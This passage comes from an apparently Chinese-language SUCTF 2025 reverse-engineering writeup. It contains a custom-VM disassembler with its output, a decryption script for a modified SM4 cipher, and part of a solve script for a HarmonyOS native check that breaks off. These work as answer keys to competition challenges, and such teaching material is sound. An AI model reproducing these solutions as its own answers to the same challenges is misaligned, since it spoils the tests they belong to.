{'func_name': 'jmp_with_comdition', 'op': 331, 'opt1': 1, 'opt2': 49, 'opt3': '0x5654d9386ad0'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 1, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'sub', 'op': 1, 'opt1': 2, 'opt2': 29, 'opt3': '0x20'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 3, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 4, 'opt2': 1, 'opt3': '0x0'},
{'func_name': 'xor', 'op': 0, 'opt1': 3, 'opt2': 3, 'opt3': '0x4'},
{'func_name': 'store', 'op': 8, 'opt1': 3, 'opt2': 2, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 3, 'opt2': 0, 'opt3': '0x8'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 4, 'opt2': 1, 'opt3': '0x8'},
{'func_name': 'xor', 'op': 0, 'opt1': 3, 'opt2': 3, 'opt3': '0x4'},
{'func_name': 'store', 'op': 8, 'opt1': 3, 'opt2': 2, 'opt3': '0x8'},
{'func_name': 'mov', 'op': 0, 'opt1': 0, 'opt2': 31, 'opt3': '0x0'},
{'func_name': 'sub', 'op': 1, 'opt1': 1, 'opt2': 29, 'opt3': '0x20'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 2, 'opt2': 29, 'opt3': '0x0'},
{'func_name': 'call', 'op': 212, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869b0'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 0, 'opt2': 29, 'opt3': '0x0'},
{'func_name': 'sub', 'op': 1, 'opt1': 1, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 2, 'opt2': 0, 'opt3': '0x0'},
{'func_name': 'store', 'op': 8, 'opt1': 2, 'opt2': 1, 'opt3': '0x0'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 2, 'opt2': 0, 'opt3': '0x8'},
{'func_name': 'store', 'op': 8, 'opt1': 2, 'opt2': 1, 'opt3': '0x8'},
{'func_name': 'load_mem', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'sub', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0x10'},
{'func_name': 'store', 'op': 4, 'opt1': 0, 'opt2': 29, 'opt3': '0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 0, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'add', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0x10'},
{'func_name': 'store', 'op': 8, 'opt1': 0, 'opt2': 29, 'opt3': '0x8'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 0, 'opt2': 29, 'opt3': '0x0'},
{'func_name': 'add', 'op': 1, 'opt1': 0, 'opt2': 0, 'opt3': '0x10'},
{'func_name': 'store', 'op': 8, 'opt1': 0, 'opt2': 29, 'opt3': '0x0'},
{'func_name': 'jmp_with_comdition', 'op': 297, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386aa0'},
{'func_name': 'add', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x100'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d93869d8'},
{'func_name': 'store', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'store', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'sub', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x10'},
{'func_name': 'mov', 'op': 1, 'opt1': 0, 'opt2': 2048, 'opt3': '0x0'},
{'func_name': 'mov', 'op': 1, 'opt1': 1, 'opt2': 2048, 'opt3': '0x0'},
{'func_name': 'mov', 'op': 1, 'opt1': 2, 'opt2': 32, 'opt3': '0x0'},
{'func_name': 'mov', 'op': 1, 'opt1': 3, 'opt2': 400, 'opt3': '0x0'},
{'func_name': 'mov', 'op': 1, 'opt1': 4, 'opt2': 416, 'opt3': '0x0'},
{'func_name': 'call', 'op': 282, 'opt1': 0, 'opt2': 49, 'opt3': '0x5654d9386aa0'},
{'func_name': 'add', 'op': 1, 'opt1': 31, 'opt2': 31, 'opt3': '0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 29, 'opt2': 31, 'opt3': '-0x10'},
{'func_name': 'load_mem', 'op': 8, 'opt1': 30, 'opt2': 31, 'opt3': '-0x8'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 33, 'opt3': '0x5654d9386a78'},
{'func_name': 'ret', 'op': 0, 'opt1': 0, 'opt2': 1041, 'opt3': '0x30307b4654435553'}]

for i in range(349):
    print(i,end=":\t")
    op = opcodes[i]
    if op["func_name"] == "mov":
        if op["op"]!=0:
            print(f"mov r{op['opt1']}, {op['opt2']:x}h")
        else:
            print(f"mov r{op['opt1']}, r{op['opt2']}")
    elif op["func_name"] == "load_mem":
        if op["op"] == 1:
            print(f"load r{op['opt1']}, byte ptr[r{op['opt2']}+{op['opt3']}]")
        elif op["op"] == 4:
            print(f"load r{op['opt1']}, dword ptr[r{op['opt2']}+{op['opt3']}]")
        elif op["op"] == 8:
            print(f"load r{op['opt1']}, qword ptr[r{op['opt2']}+{op['opt3']}]")
    elif op["func_name"] == "store":
        if op["op"] == 1:
            print(f"store r{op['opt1']}, byte ptr[r{op['opt2']}+{op['opt3']}]")
        elif op["op"] == 4:
            print(f"store r{op['opt1']}, dword ptr[r{op['opt2']}+{op['opt3']}]")
        elif op["op"] == 8:
            print(f"store r{op['opt1']}, qword ptr[r{op['opt2']}+{op['opt3']}]")
    elif op["func_name"] == "cmp":
        if op["op"]!=0:
            print(f"cmp r{op['opt1']}, {op['opt2']:x}h")
        else:
            print(f"cmp r{op['opt1']}, r{op['opt2']}")
    elif op["func_name"] == "jmp_with_comdition":
        if op["opt1"] == 0:
            print(f"jmp {op['op']}")
        elif op["opt1"] == 1:
            print(f"jz {op['op']}")
        elif op["opt1"] == 2:
            print(f"jnz {op['op']}")
        elif op["opt1"] == 3:
            print(f"jg {op['op']}")
        elif op["opt1"] == 4:
            print(f"jge {op['op']}")
        elif op["opt1"] == 5:
            print(f"jl {op['op']}")
        elif op["opt1"] == 6:
            print(f"jle {op['op']}")
        else:
            print("nop")
    elif op["func_name"] == "call":
        print(f"call {op['op']}")
    elif op["func_name"] == "ret":
        print(f"ret\n")
    elif op["func_name"] == "add":
        if op['op'] !=0:
            print(f"add r{op['opt1']}, r{op['opt2']}, {op['opt3']}")
        else:
            print(f"add r{op['opt1']}, r{op['opt2']}, r{int(op['opt3'],16)}")
    elif op["func_name"] == "sub":
        if op['op'] !=0:
            print(f"sub r{op['opt1']}, r{op['opt2']}, {op['opt3']}")
        else:
            print(f"sub r{op['opt1']}, r{op['opt2']}, r{int(op['opt3'],16)}")
    elif op["func_name"] == "and":
        if op['op'] !=0:
            print(f"and r{op['opt1']}, r{op['opt2']}, {op['opt3']}")
        else:
            print(f"and r{op['opt1']}, r{op['opt2']}, r{int(op['opt3'],16)}")
    elif op["func_name"] == "or":
        if op['op'] !=0:
            print(f"or r{op['opt1']}, r{op['opt2']}, {op['opt3']}")
        else:
            print(f"or r{op['opt1']}, r{op['opt2']}, r{int(op['opt3'],16)}")
    elif op["func_name"] == "xor":
        if op['op'] !=0:
            print(f"xor r{op['opt1']}, r{op['opt2']}, {op['opt3']}")
        else:
            print(f"xor r{op['opt1']}, r{op['opt2']}, r{int(op['opt3'],16)}")
    elif op["func_name"] == "shr":
        if op['op'] !=0:
            print(f"shr r{op['opt1']}, r{op['opt2']}, {op['opt3']}")
        else:
            print(f"shr r{op['opt1']}, r{op['opt2']}, r{int(op['opt3'],16)}")
    elif op["func_name"] == "shl":
        if op['op'] !=0:
            print(f"shl r{op['opt1']}, r{op['opt2']}, {op['opt3']}")
        else:
            print(f"shl r{op['opt1']}, r{op['opt2']}, r{int(op['opt3'],16)}")
```

```Python
C:\Users\Administrator\AppData\Local\Programs\Python\Python310\python.exe C:\Users\Administrator\PycharmProjects\pythonProject\suctf\vm.py 
0:        mov r3, r0
1:        add r1, r1, r2
2:        xor r0, r0, r0
3:        load r2, byte ptr[r1+0x0]
4:        shl r2, r2, 0x10
5:        or r0, r0, r2
6:        load r2, byte ptr[r1+0x1]
7:        shl r2, r2, 0x8
8:        or r0, r0, r2
9:        load r2, byte ptr[r1+0x2]
10:        shl r2, r2, 0x0
11:        or r0, r0, r2
12:        load r2, byte ptr[r1+0x3]
13:        shl r2, r2, 0x18
14:        or r0, r0, r2
15:        store r0, dword ptr[r3+0x0]
16:        ret

17:        add r1, r1, r2
18:        shr r2, r0, 0x10
19:        store r2, byte ptr[r1+0x0]
20:        shr r2, r0, 0x8
21:        store r2, byte ptr[r1+0x1]
22:        shr r2, r0, 0x0
23:        store r2, byte ptr[r1+0x2]
24:        shr r2, r0, 0x18
25:        store r2, byte ptr[r1+0x3]
26:        ret

27:        and r0, r0, 0xffffffff
28:        and r1, r1, 0x1f
29:        shl r2, r0, r1
30:        mov r3, 32h
31:        sub r1, r3, r1
32:        shr r0, r0, r1
33:        or r0, r0, r2
34:        and r0, r0, 0xffffffff
35:        ret

36:        and r0, r0, 0xff
37:        mov r1, 0h
38:        add r0, r0, r1
39:        load r0, byte ptr[r0+0x0]
40:        ret

41:        store r30, qword ptr[r31+-0x8]
42:        store r29, qword ptr[r31+-0x10]
43:        store r19, qword ptr[r31+-0x18]
44:        sub r29, r31, 0x20
45:        sub r31, r31, 0x60
46:        sub r1, r29, 0x10
47:        xor r2, r2, r2
48:        call 17
49:        load r0, byte ptr[r29+-0x10]
50:        call 36
51:        store r0, byte ptr[r29+-0x20]
52:        load r0, byte ptr[r29+-0xf]
53:        call 36
54:        store r0, byte ptr[r29+-0x1f]
55:        load r0, byte ptr[r29+-0xe]
56:        call 36
57:        store r0, byte ptr[r29+-0x1e]
58:        load r0, byte ptr[r29+-0xd]
59:        call 36
60:        store r0, byte ptr[r29+-0x1d]
61:        sub r0, r29, 0x30
62:        sub r1, r29, 0x20
63:        mov r2, 0h
64:        call 0
65:        load r19, dword ptr[r29+-0x30]
66:        load r0, dword ptr[r29+-0x30]
67:        mov r1, 2h
68:        call 27
69:        xor r19, r19, r0
70:        load r0, dword ptr[r29+-0x30]
71:        mov r1, 10h
72:        call 27
73:        xor r19, r19, r0
74:        load r0, dword ptr[r29+-0x30]
75:        mov r1, 18h
76:        call 27
77:        xor r19, r19, r0
78:        load r0, dword ptr[r29+-0x30]
79:        mov r1, 24h
80:        call 27
81:        xor r0, r19, r0
82:        add r31, r31, 0x60
83:        load r19, qword ptr[r31+-0x18]
84:        load r29, qword ptr[r31+-0x10]
85:        load r30, qword ptr[r31+-0x8]
86:        ret

87:        store r30, qword ptr[r31+-0x8]
88:        store r0, qword ptr[r31+-0x10]
89:        sub r31, r31, 0x10
90:        xor r0, r1, r2
91:        xor r0, r0, r3
92:        xor r0, r0, r4
93:        call 41
94:        add r31, r31, 0x10
95:        load r1, qword ptr[r31+-0x10]
96:        load r30, qword ptr[r31+-0x8]
97:        xor r0, r0, r1
98:        ret

99:        store r30, qword ptr[r31+-0x8]
100:        store r29, qword ptr[r31+-0x10]
101:        store r19, qword ptr[r31+-0x18]
102:        sub r29, r31, 0x20
103:        sub r31, r31, 0x60
104:        sub r1, r29, 0x10
105:        xor r2, r2, r2
106:        call 17
107:        load r0, byte ptr[r29+-0x10]
108:        call 36
109:        store r0, byte ptr[r29+-0x20]
110:        load r0, byte ptr[r29+-0xf]
111:        call 36
112:        store r0, byte ptr[r29+-0x1f]
113:        load r0, byte ptr[r29+-0xe]
114:        call 36
115:        store r0, byte ptr[r29+-0x1e]
116:        load r0, byte ptr[r29+-0xd]
117:        call 36
118:        store r0, byte ptr[r29+-0x1d]
119:        sub r0, r29, 0x30
120:        sub r1, r29, 0x20
121:        mov r2, 0h
122:        call 0
123:        load r19, dword ptr[r29+-0x30]
124:        load r0, dword ptr[r29+-0x30]
125:        mov r1, 13h
126:        call 27
127:        xor r19, r19, r0
128:        load r0, dword ptr[r29+-0x30]
129:        mov r1, 23h
130:        call 27
131:        xor r0, r19, r0
132:        add r31, r31, 0x60
133:        load r19, qword ptr[r31+-0x18]
134:        load r29, qword ptr[r31+-0x10]
135:        load r30, qword ptr[r31+-0x8]
136:        ret

137:        store r30, qword ptr[r31+-0x8]
138:        store r29, qword ptr[r31+-0x10]
139:        store r1, qword ptr[r31+-0x18]
140:        store r0, qword ptr[r31+-0x20]
141:        sub r29, r31, 0x20
142:        sub r31, r31, 0x100
143:        sub r0, r29, 0x10
144:        load r1, qword ptr[r29+0x8]
145:        mov r2, 0h
146:        call 0
147:        sub r0, r29, 0xc
148:        load r1, qword ptr[r29+0x8]
149:        mov r2, 4h
150:        call 0
151:        sub r0, r29, 0x8
152:        load r1, qword ptr[r29+0x8]
153:        mov r2, 8h
154:        call 0
155:        sub r0, r29, 0x4
156:        load r1, qword ptr[r29+0x8]
157:        mov r2, 12h
158:        call 0
159:        sub r0, r29, 0x10
160:        mov r1, 256h
161:        mov r2, r31
162:        load r3, dword ptr[r0+0x0]
163:        load r4, dword ptr[r1+0x0]
164:        xor r3, r3, r4
165:        store r3, dword ptr[r2+0x0]
166:        load r3, dword ptr[r0+0x4]
167:        load r4, dword ptr[r1+0x4]
168:        xor r3, r3, r4
169:        store r3, dword ptr[r2+0x4]
170:        load r3, dword ptr[r0+0x8]
171:        load r4, dword ptr[r1+0x8]
172:        xor r3, r3, r4
173:        store r3, dword ptr[r2+0x8]
174:        load r3, dword ptr[r0+0xc]
175:        load r4, dword ptr[r1+0xc]
176:        xor r3, r3, r4
177:        store r3, dword ptr[r2+0xc]
178:        mov r0, 0h
179:        store r0, dword ptr[r29+-0x20]
180:        load r0, dword ptr[r29+-0x20]
181:        cmp r0, 20h
182:        jle 208
183:        shl r0, r0, 0x2
184:        add r1, r31, r0
185:        mov r2, 272h
186:        add r2, r2, r0
187:        load r2, dword ptr[r2+0x0]
188:        load r0, dword ptr[r1+0x4]
189:        xor r0, r0, r2
190:        load r2, dword ptr[r1+0x8]
191:        xor r0, r0, r2
192:        load r2, dword ptr[r1+0xc]
193:        xor r0, r0, r2
194:        call 99
195:        load r1, dword ptr[r29+-0x20]
196:        shl r1, r1, 0x2
197:        add r2, r31, r1
198:        load r3, dword ptr[r2+0x0]
199:        xor r0, r0, r3
200:        store r0, dword ptr[r2+0x10]
201:        load r2, qword ptr[r29+0x0]
202:        add r2, r2, r1
203:        store r0, dword ptr[r2+0x0]
204:        load r0, dword ptr[r29+-0x20]
205:        add r0, r0, 0x1
206:        store r0, dword ptr[r29+-0x20]
207:        jmp 180
208:        add r31, r31, 0x100
209:        load r29, qword ptr[r31+-0x10]
210:        load r30, qword ptr[r31+-0x8]
211:        ret

212:        store r30, qword ptr[r31+-0x8]
213:        store r29, qword ptr[r31+-0x10]
214:        store r2, qword ptr[r31+-0x20]
215:        store r1, qword ptr[r31+-0x28]
216:        store r0, qword ptr[r31+-0x30]
217:        sub r29, r31, 0x30
218:        sub r31, r31, 0x100
219:        add r0, r31, 0x0
220:        load r1, qword ptr[r29+0x8]
221:        mov r2, 0h
222:        call 0
223:        add r0, r31, 0x4
224:        load r1, qword ptr[r29+0x8]
225:        mov r2, 4h
226:        call 0
227:        add r0, r31, 0x8
228:        load r1, qword ptr[r29+0x8]
229:        mov r2, 8h
230:        call 0
231:        add r0, r31, 0xc
232:        load r1, qword ptr[r29+0x8]
233:        mov r2, 12h
234:        call 0
235:        mov r0, 0h
236:        store r0, dword ptr[r29+-0x10]
237:        load r4, dword ptr[r29+-0x10]
238:        cmp r4, 20h
239:        jle 262
240:        shl r4, r4, 0x2
241:        add r3, r31, r4
242:        load r0, qword ptr[r29+0x0]
243:        add r0, r0, r4
244:        load r4, dword ptr[r0+0x0]
245:        load r0, dword ptr[r3+0x0]
246:        load r1, dword ptr[r3+0x4]
247:        load r2, dword ptr[r3+0x8]
248:        load r3, dword ptr[r3+0xc]
249:        call 87
250:        mov r1, 3735879680h
251:        mov r2, 48879h
252:        xor r1, r1, r2
253:        xor r0, r0, r1
254:        load r4, dword ptr[r29+-0x10]
255:        shl r4, r4, 0x2
256:        add r4, r31, r4
257:        store r0, dword ptr[r4+0x10]
258:        load r0, dword ptr[r29+-0x10]
259:        add r0, r0, 0x1
260:        store r0, dword ptr[r29+-0x10]
261:        jmp 237
262:        load r0, dword ptr[r31+0x8c]
263:        load r1, qword ptr[r29+0x10]
264:        mov r2, 0h
265:        call 17
266:        load r0, dword ptr[r31+0x88]
267:        load r1, qword ptr[r29+0x10]
268:        mov r2, 4h
269:        call 17
270:        load r0, dword ptr[r31+0x84]
271:        load r1, qword ptr[r29+0x10]
272:        mov r2, 8h
273:        call 17
274:        load r0, dword ptr[r31+0x80]
275:        load r1, qword ptr[r29+0x10]
276:        mov r2, 12h
277:        call 17
278:        add r31, r31, 0x100
279:        load r29, qword ptr[r31+-0x10]
280:        load r30, qword ptr[r31+-0x8]
281:        ret

282:        store r30, qword ptr[r31+-0x8]
283:        store r29, qword ptr[r31+-0x10]
284:        store r2, dword ptr[r31+-0x20]
285:        store r1, qword ptr[r31+-0x28]
286:        store r0, qword ptr[r31+-0x30]
287:        sub r29, r31, 0x30
288:        sub r31, r31, 0x100
289:        sub r0, r29, 0x10
290:        load r1, qword ptr[r4+0x0]
291:        store r1, qword ptr[r0+0x0]
292:        load r1, qword ptr[r4+0x8]
293:        store r1, qword ptr[r0+0x8]
294:        mov r0, r31
295:        mov r1, r3
296:        call 137
297:        load r1, dword ptr[r29+0x10]
298:        cmp r1, 0h
299:        jz 331
300:        sub r0, r29, 0x10
301:        load r1, qword ptr[r29+0x8]
302:        sub r2, r29, 0x20
303:        load r3, qword ptr[r0+0x0]
304:        load r4, qword ptr[r1+0x0]
305:        xor r3, r3, r4
306:        store r3, qword ptr[r2+0x0]
307:        load r3, qword ptr[r0+0x8]
308:        load r4, qword ptr[r1+0x8]
309:        xor r3, r3, r4
310:        store r3, qword ptr[r2+0x8]
311:        mov r0, r31
312:        sub r1, r29, 0x20
313:        load r2, qword ptr[r29+0x0]
314:        call 212
315:        load r0, qword ptr[r29+0x0]
316:        sub r1, r29, 0x10
317:        load r2, qword ptr[r0+0x0]
318:        store r2, qword ptr[r1+0x0]
319:        load r2, qword ptr[r0+0x8]
320:        store r2, qword ptr[r1+0x8]
321:        load r0, dword ptr[r29+0x10]
322:        sub r0, r0, 0x10
323:        store r0, dword ptr[r29+0x10]
324:        load r0, qword ptr[r29+0x8]
325:        add r0, r0, 0x10
326:        store r0, qword ptr[r29+0x8]
327:        load r0, qword ptr[r29+0x0]
328:        add r0, r0, 0x10
329:        store r0, qword ptr[r29+0x0]
330:        jmp 297
331:        add r31, r31, 0x100
332:        load r29, qword ptr[r31+-0x10]
333:        load r30, qword ptr[r31+-0x8]
334:        ret

335:        store r30, qword ptr[r31+-0x8]
336:        store r29, qword ptr[r31+-0x10]
337:        sub r31, r31, 0x10
338:        mov r0, 2048h
339:        mov r1, 2048h
340:        mov r2, 32h
341:        mov r3, 400h
342:        mov r4, 416h
343:        call 282
344:        add r31, r31, 0x10
345:        load r29, qword ptr[r31+-0x10]
346:        load r30, qword ptr[r31+-0x8]
347:        ret

348:        ret


Process finished with exit code 0
```

load32和store32进行了魔改

并在T轮中添加了异或0xdeadbeef

```Python
S_BOX = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,
         0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
         0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,
         0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,
         0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8,
         0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,
         0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87,
         0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E,
         0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1,
         0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3,
         0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F,
         0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51,
         0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8,
         0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0,
         0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84,
         0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48
         ]

FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]
CK = [
    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,
    0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,
    0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,
    0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,
    0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,
    0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,
    0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,
    0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279
]


def wd_to_byte(wd):
    t = [(wd >> i) & 0xff for i in range(16, -1, -8)] + [(wd >> 24) & 0xff]
    return t


def bys_to_wd(bys):
    ret = 0
    for i in range(4):
        bits = (16 - i * 8)%32
        ret |= (bys[i] << bits)
    return ret


def s_box(wd):
    """
    进行非线性变换，查S盒
    :param wd: 输入一个32bits字
    :return: 返回一个32bits字   ->int
    """
    ret = []
    for i in range(0, 4):
        byte = (wd >> (24 - i * 8)) & 0xff
        row = byte >> 4
        col = byte & 0x0f
        index = (row * 16 + col)
        ret.append(S_BOX[index])
    return int.from_bytes(bytes(ret),"big")


def rotate_left(wd, bit):
    """
    :param wd: 待移位的字
    :param bit: 循环左移位数
    :return:
    """
    return (wd << bit & 0xffffffff) | (wd >> (32 - bit))



def Linear_transformation(wd):
    """
    进行线性变换L
    :param wd: 32bits输入
    """
    return wd ^ rotate_left(wd, 2) ^ rotate_left(wd, 10) ^ rotate_left(wd, 18) ^ rotate_left(wd, 24)


def Tx(k1, k2, k3, ck):
    """
    密钥扩展算法的合成变换
    """
    xor = k1 ^ k2 ^ k3 ^ ck
    t = s_box(k1 ^ k2 ^ k3 ^ ck)
    return t ^ rotate_left(t, 13) ^ rotate_left(t, 23)


def T(x1, x2, x3, rk):
    """
    加密算法轮函数的合成变换
    """
    t = x1 ^ x2 ^ x3 ^ rk
    t = s_box(t)
    return t ^ rotate_left(t, 2) ^ rotate_left(t, 10) ^ rotate_left(t, 18) ^ rotate_left(t, 24)


def key_extend(main_key):
    X = bytes.fromhex(main_key)
    MK = [bys_to_wd(X[i * 4:i * 4 + 4]) for i in range(4)]
    # 将128bits分为4个字
    keys = [FK[i] ^ MK[i] for i in range(4)]
    # 生成K0~K3
    RK = []
    for i in range(32):
        t = Tx(keys[i + 1], keys[i + 2], keys[i + 3], CK[i])
        k = keys[i] ^ t
        keys.append(k)
        RK.append(k)
    return RK


def R(x0, x1, x2, x3):
    # 使用位运算符将数值限制在32位范围内
    x0 &= 0xffffffff
    x1 &= 0xffffffff
    x2 &= 0xffffffff
    x3 &= 0xffffffff
    s = f"{bytes(wd_to_byte(x3)).hex().zfill(8)}{bytes(wd_to_byte(x2)).hex().zfill(8)}{bytes(wd_to_byte(x1)).hex().zfill(8)}{bytes(wd_to_byte(x0)).hex().zfill(8)}"
    return s


def encode(plaintext, rk):
    X = bytes.fromhex(plaintext)
    X = [bys_to_wd(X[i*4:i*4+4]) for i in range(4)]
    for i in range(32):
        t = T(X[1], X[2], X[3], rk[i])
        c = (t ^ X[0])
        c ^=0xdeadbeef
        X = X[1:] + [c]
    ciphertext = R(X[0], X[1], X[2], X[3])

    # 进行反序处理
    return ciphertext


def decode(ciphertext, rk):
    X = bytes.fromhex(ciphertext)
    X = [bys_to_wd(X[i * 4:i * 4 + 4]) for i in range(4)]
    for i in range(32):
        t = T(X[1], X[2], X[3], rk[31 - i])
        c = (t ^ X[0])^0xdeadbeef
        X = X[1:] + [c]
    m = R(X[0], X[1], X[2], X[3])
    return m


def output(s, name):
    out = ""
    for i in range(0, len(s), 2):
        out += s[i:i + 2] + " "
    print(f"{name}:", end="")
    print(out.strip())
def xor_iv(a,iv):
    pt = bytes.fromhex(a)
    iv = bytes.fromhex(iv)
    pt = bytearray(pt)
    iv = bytearray(iv)
    pt = [pt[i] ^ iv[i] for i in range(16)]
    pt = bytes(pt).hex()
    return pt

if __name__ == '__main__':
    # plaintext = 'F0A8BC50D93AF7CE4928EA7733B417B'
    # # 08EB9A5ADD272DE2F4672F24C6D413438
    # # 736F6D657468696E676E6F74676F6F64
    # main_key = 0x736F6D657468696E6776657279626164
    # rk = key_extend(main_key)
    #
    # print("解密:")
    # m = decode(plaintext, rk)
    # output(m, "plaintext")
    pt = "30303030303030303030303030303030"
    iv = "736F6D657468696E676E6F74676F6F64"
    pt = xor_iv(pt,iv)

    main_key = "736F6D657468696E6776657279626164"
    rk = key_extend(main_key)
    enc2 = "8EB9A5ADD272DE2F4672F24C6D413438"
    enc = "F0A8BC50D93AF7CE4928EA7733B417B0"
    enc2 = decode(enc2, rk)
    enc2 = xor_iv(enc2, enc)

    enc = decode(enc, rk)
    enc = xor_iv(enc, iv)
    print(bytes.fromhex(enc).decode()+bytes.fromhex(enc2).decode())
    # BC81FCEC312940A965EF302D1C0E0959
    # 77879288B5B0C5BA930A8DA2CA517EC9
```

### SU\_Harmony

鸿蒙hap逆向，abc层就只是调用native层的check函数进行check

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-08-38.png" alt="SUCTF_2025_Writeup-2025-01-14-16-08-38" position="center" style="border-radius: 1px;" >}}

找到so层的check函数，映入眼帘的是一大片混淆代码，从这一坨里面提取出有用的信息

输入的flag长度为32

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-08-41.png" alt="SUCTF_2025_Writeup-2025-01-14-16-08-41" position="center" style="border-radius: 1px;" >}}

然后将输入的字符串4个字节一组，分八组，调用sub\_57B0进 行check

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-08-45.png" alt="SUCTF_2025_Writeup-2025-01-14-16-08-45" position="center" style="border-radius: 1px;" >}}

里面也是一堆混淆，放到记事本里手动将混淆代码咔咔删掉，然后喂给AI让他分析一下，最终得到函数的大致逻辑，总体就是实现了一个大数运算，加减乘除嘛

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-08-51.png" alt="SUCTF_2025_Writeup-2025-01-14-16-08-51" position="center" style="border-radius: 1px;" >}}

验证一下，很完美

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-19-24-11.jpg" alt="SUCTF_2025_Writeup-2025-01-14-19-24-11" position="center" style="border-radius: 1px;" >}}

exp:

```Python
import math
from Crypto.Util.number import long_to_bytes

s = [
    999272289930604998,
    1332475531266467542,
    1074388003071116830,
    1419324015697459326,
    978270870200633520,
    369789474534896558,
    344214162681978048,
    2213954953857181622,
]


def decrypt(enc):
    e = enc * 2
    d = e + 3
    a = -1 + math.sqrt(1 + d)
    a = int(a)
    return a


for i in s:
    a = decrypt(i)
